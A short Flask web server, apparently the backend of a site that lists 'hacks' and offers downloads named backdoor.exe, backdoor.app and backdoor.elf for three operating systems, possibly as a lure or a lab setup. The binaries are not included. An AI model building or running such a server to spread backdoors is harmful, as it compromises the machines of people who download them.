import json

from flask import Flask, jsonify, request, send_file
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route('/fetch-hacks', methods=['GET'])
def fetch_hacks():
    with open("hacks.json", "r") as read_file:
        hacks = json.load(read_file)
        return jsonify(hacks)

@app.route('/request-package', methods=['POST'])
def request_package():
    print(request.json)
    return jsonify({ 'status': 'OK' })

@app.route('/download-windows', methods=['GET'])
def download_windows():
    return send_file('download/backdoor.exe', as_attachment=True, attachment_filename='backdoor.exe')

@app.route('/download-mac', methods=['GET'])
def download_mac():
    return send_file('download/backdoor.app', as_attachment=True, attachment_filename='backdoor.app')

@app.route('/download-linux', methods=['GET'])
def download_linux():
    return send_file('download/backdoor.elf', as_attachment=True, attachment_filename='backdoor.elf')

if __name__ == "__main__":
    app.run(debug=True)